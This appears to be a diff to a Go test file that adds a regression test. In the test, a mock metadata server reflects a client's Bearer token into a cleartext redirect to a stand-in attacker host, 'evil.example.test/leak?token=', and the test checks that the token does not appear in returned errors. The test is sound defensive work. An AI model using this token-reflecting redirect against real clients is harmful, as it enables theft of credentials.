@@ -400,6 +400,34 @@ func TestOriginKeyCaseInsensitiveHost(t *testing.T) {
 	}
 }
 
+// TestRedirectReflectingTokenIsRedactedFromError is the H4 regression proof: a
+// hostile metadata endpoint reflects the client's Bearer instance token into a
+// redirect Location whose target (cleartext http to a non-loopback host) makes
+// the redirect fail validation — so the token-bearing URL lands inside the
+// transport/redirect error net/http returns. The Client must scrub the token
+// from EVERY error it hands back, so the returned error (which main.go logs to
+// stderr) must contain no substring of the token.
+func TestRedirectReflectingTokenIsRedactedFromError(t *testing.T) {
+	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// Reflect the actual bearer token the client sent into a cleartext,
+		// non-loopback redirect target — the exact "reflect the bearer into the
+		// URL" vector H4 describes.
+		token := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
+		http.Redirect(w, r, "http://evil.example.test/leak?token="+token, http.StatusFound)
+	}))
+	defer srv.Close()
+
+	c := newTestClient(t, srv, WithRetry(0, time.Millisecond))
+	_, err := c.get(context.Background(), "credentials/runner")
+	if err == nil {
+		t.Fatal("expected the hostile cleartext redirect to be rejected, got nil error")
+	}
+	if strings.Contains(err.Error(), testToken) {
+		t.Fatalf("TOKEN LEAK: metadata error contains the instance token %q:\n%s", testToken, err.Error())
+	}
+	t.Logf("hostile-redirect error is token-free: %s", err.Error())
+}
+
 func TestTarArchiveRoundTrips(t *testing.T) {
 	files := []CredentialFileContent{
 		{Name: "runner", Bytes: []byte("aaa")},
